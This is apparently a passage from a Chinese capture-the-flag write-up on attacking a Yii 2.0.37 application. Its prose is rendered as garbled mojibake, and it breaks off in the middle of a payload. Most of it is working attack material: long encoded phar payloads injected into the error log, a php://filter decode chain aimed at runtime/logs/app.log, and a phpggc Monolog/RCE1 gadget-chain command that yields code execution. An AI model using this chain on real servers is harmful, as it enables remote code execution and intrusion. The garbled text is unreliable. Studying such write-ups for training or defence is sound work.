D00o%3D00i%3D00T%3D00W%3D009%3D00u%3D00b%3D002%3D00x%3D00v%3D00Z%3D001%3D00x%3D00I%3D00Y%3D00W%3D005%3D00k%3D00b%3D00G%3D00V%3D00y%3D00X%3D00F%3D00N%3D005%3D00c%3D002%3D00x%3D00v%3D00Z%3D001%3D00V%3D00k%3D00c%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00I%3D00i%3D00O%3D00j%3D00E%3D006%3D00e%3D003%3D00M%3D006%3D00O%3D00T%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00c%3D002%3D009%3D00j%3D00a%3D002%3D00V%3D000%3D00I%3D00j%3D00t%3D00P%3D00O%3D00j%3D00I%3D005%3D00O%3D00i%3D00J%3D00N%3D00b%3D002%3D005%3D00v%3D00b%3D00G%3D009%3D00n%3D00X%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00J%3D00c%3D00Q%3D00n%3D00V%3D00m%3D00Z%3D00m%3D00V%3D00y%3D00S%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D006%3D00N%3D00z%3D00p%3D007%3D00c%3D00z%3D00o%3D00x%3D00M%3D00D%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00a%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D007%3D00c%3D00j%3D00o%3D00y%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00l%3D00N%3D00p%3D00e%3D00m%3D00U%3D00i%3D00O%3D002%3D00k%3D006%3D00L%3D00T%3D00E%3D007%3D00c%3D00z%3D00o%3D005%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00i%3D00d%3D00W%3D00Z%3D00m%3D00Z%3D00X%3D00I%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00T%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00d%3D002%3D00h%3D00v%3D00Y%3D00W%3D001%3D00p%3D00I%3D00j%3D00t%3D00z%3D00O%3D00j%3D00U%3D006%3D00I%3D00m%3D00x%3D00l%3D00d%3D00m%3D00V%3D00s%3D00I%3D00j%3D00t%3D00O%3D00O%3D003%3D001%3D009%3D00c%3D00z%3D00o%3D004%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00s%3D00Z%3D00X%3D00Z%3D00l%3D00b%3D00C%3D00I%3D007%3D00T%3D00j%3D00t%3D00z%3D00O%3D00j%3D00E%3D000%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00p%3D00b%3D00m%3D00l%3D000%3D00a%3D00W%3D00F%3D00s%3D00a%3D00X%3D00p%3D00l%3D00Z%3D00C%3D00I%3D007%3D00Y%3D00j%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00Q%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00k%3D00x%3D00p%3D00b%3D00W%3D00l%3D000%3D00I%3D00j%3D00t%3D00p%3D00O%3D00i%3D000%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00H%3D00B%3D00y%3D00b%3D002%3D00N%3D00l%3D00c%3D003%3D00N%3D00v%3D00c%3D00n%3D00M%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00z%3D00o%3D00i%3D00Y%3D003%3D00V%3D00y%3D00c%3D00m%3D00V%3D00u%3D00d%3D00C%3D00I%3D007%3D00a%3D00T%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00c%3D003%3D00l%3D00z%3D00d%3D00G%3D00V%3D00t%3D00I%3D00j%3D00t%3D009%3D00f%3D00X%3D000%3D00F%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00H%3D00V%3D00t%3D00b%3D00X%3D00k%3D00E%3D00A%3D00A%3D00A%3D00A%3D00n%3D00l%3D00Y%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00I%3D00A%3D00A%3D00A%3D00A%3D00d%3D00G%3D00V%3D00z%3D00d%3D00C%3D005%3D000%3D00e%3D00H%3D00Q%3D00E%3D00A%3D00A%3D00A%3D00A%3D00n%3D00l%3D00Y%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D000%3D00Z%3D00X%3D00N%3D000%3D00d%3D00G%3D00V%3D00z%3D00d%3D00D%3D00G%3D00x%3D00J%3D00s%3D00N%3D008%3D00T%3D00m%3D00i%3D00e%3D00m%3D00D%3D009%3D00t%3D00b%3D00O%3D00M%3D00J%3D00u%3D006%3D001%3D00%2F%3D00m%3D004%3D00%2B%3D00U%3D00A%3D00g%3D00A%3D00A%3D00A%3D00E%3D00d%3D00C%3D00T%3D00U%3D00I%3D00%3D3D ç°åœ¨çš„æ—¥å¿—ä¸º 123456789101112131415161718192021222324252021-08-06 15:43:45 [127.0.0.1][-][m5eo8a3oid4qokv39jervs5cs8][error][yii\\base\\ErrorException:2] yii\\base\\ErrorException: file_get_contents(xxxxxxxxxxxxxxx): failed to open stream: No such file or directory in E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\controllers\\SiteController.php:65Stack trace:#0 [internal function]: yii\\base\\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;E:\\\\phpstudy\\\\PHP...&#39;, 65, Array)#1 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\controllers\\SiteController.php(65): file_get_contents(&#39;xxxxxxxxxxxxxxx&#39;)#2 [internal function]: app\\controllers\\SiteController-&gt;actionIndex()#3 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(57): call_user_func_array(Array, Array)#4 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Controller.php(181): yii\\base\\InlineAction-&gt;runWithParams(Array)#5 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Module.php(534): yii\\base\\Controller-&gt;runAction(&#39;index&#39;, Array)#6 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\web\\Application.php(104): yii\\base\\Module-&gt;runAction(&#39;site&#x2F;index&#39;, Array)#7 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Application.php(392): yii\\web\\Application-&gt;handleRequest(Object(yii\\web\\Request))#8 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\web\\index.php(12): yii\\base\\Application-&gt;run()#9 &#123;main&#125;2021-08-06 15:44:02 [127.0.0.1][-][m5eo8a3oid4qokv39jervs5cs8][error][yii\\base\\ErrorException:2] yii\\base\\ErrorException: file_get_contents(xxxxxxxxxxxxxxx&#x3D;00P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00 &#x3D;00D&#x3D;00Q&#x3D;00q&#x3D;00v&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00Y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00d&#x3D;002&#x3D;00h&#x3D;00v&#x3D;00Y&#x3D;00W&#x3D;001&#x3D;00p&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00n&#x3D;00l&#x3D;00Y&#x3D;00N&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00p&#x3D;00A&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00n&#x3D;00l&#x3D;00Y&#x3D;00N&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00p&#x3D;00A&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00G&#x3D;00x&#x3D;00J&#x3D;00s&#x3D;00N&#x3D;008&#x3D;00T&#x3D;00m&#x3D;00i&#x3D;00e&#x3D;00m&#x3D;00D&#x3D;009&#x3D;00t&#x3D;00b&#x3D;00O&#x3D;00M&#x3D;00J&#x3D;00u&#x3D;006&#x3D;001&#x3D;00&#x2F;&#x3D;00m&#x3D;004&#x3D;00 &#x3D;00U&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;3D): failed to open stream: Invalid argument in E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\controllers\\SiteController.php:65Stack trace:#0 [internal function]: yii\\base\\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;E:\\\\phpstudy\\\\PHP...&#39;, 65, Array)#1 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\controllers\\SiteController.php(65): file_get_contents(&#39;xxxxxxxxxxxxxxx...&#39;)#2 [internal function]: app\\controllers\\SiteController-&gt;actionIndex()#3 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(57): call_user_func_array(Array, Array)#4 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Controller.php(181): yii\\base\\InlineAction-&gt;runWithParams(Array)#5 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Module.php(534): yii\\base\\Controller-&gt;runAction(&#39;index&#39;, Array)#6 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\web\\Application.php(104): yii\\base\\Module-&gt;runAction(&#39;site&#x2F;index&#39;, Array)#7 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Application.php(392): yii\\web\\Application-&gt;handleRequest(Object(yii\\web\\Request))#8 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\web\\index.php(12): yii\\base\\Application-&gt;run()#9 &#123;main&#125; ç»è¿‡éªŒè¯ï¼Œåˆšå¥½ç¬¦åˆå¶æ•°çš„ä¸¤ä¸ªæ¡ä»¶ï¼Œè¿›è¡Œç¼–ç è§£ç  1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log çœ‹ç»“æœï¼Œå¦‚æœç»“æœä¸ºç©ºï¼Œé‚£æ˜¯payloadå‰é¢çš„å­—èŠ‚æ•°æˆå•æ•°äº†ï¼Œç»™payloadå‰åå„åŠ ä¸€ä¸ªå­—ç¬¦å¯ä»¥è§£å†³ï¼Œå¦‚æœç¬¬ä¸€æ¬¡æˆåŠŸå°±ä¸ç”¨åŠ äº†ï¼Œå¦‚æœå¤±è´¥ï¼Œä¹Ÿæ˜¯é‡æ–°å†æ¥ä¸€æ¬¡è€Œå·² å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²ç»æ„é€ å‡ºpharæ–‡ä»¶äº†ï¼Œæ¥ä¸‹æ¥å°±æ‰¾é“¾å­ï¼Œæ‰“äº† è§£é¢˜ æ ¹æ®ä¸Šé¢æ­¥éª¤ é“¾å­ç”¨è¿™ä¸ª 1.&#x2F;phpggc Monolog&#x2F;RCE1 &quot;phpinfo&quot; &quot;1&quot; --phar phar&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;payload å°†pharå¤„ç†ä¸€ä¸‹(php://filter/read=convert.base64-encode|convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode/resource=payload) å¾—åˆ° payload 1&#x3D;00P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00q&#x3D;00r&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00U&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00M&#x3D;00S&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;001&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;002&#x3D;00Z&#x3D;00W&#x3D;00w&#x3D;00i&#x3D;00O&#x3D;000&#x3D;004&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00N&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00W&#x3D;005&#x3D;00p&#x3D;00d&#x3D;00G&#x3D;00l&#x3D;00h&#x3D;00b&#x3D;00G&#x3D;00l&#x3D;006&#x3D;00Z&#x3D;00W&#x3D;00Q&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00I&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00M&#x3D;00a&#x3D;00W&#x3D;001&#x3D;00p&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00t&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;00z&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00w&#x3D;00c&#x3D;00m&#x3D;009&#x3D;00j&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;00z&#x3D;00b&#x3D;003&#x3D;00J&#x3D;00z&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00h&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;006&#x3D;00e&#x3D;002&#x3D;00k&#x3D;006&#x3D;00M&#x3D;00D&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00N&#x3D;001&#x3D;00c&#x3D;00n&#x3D;00J&#x3D;00l&#x3D;00b&#x3D;00n&#x3D;00Q&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00n&#x3D;00B&#x3D;00o&#x3D;00c&#x3D;00G&#x3D;00l&#x3D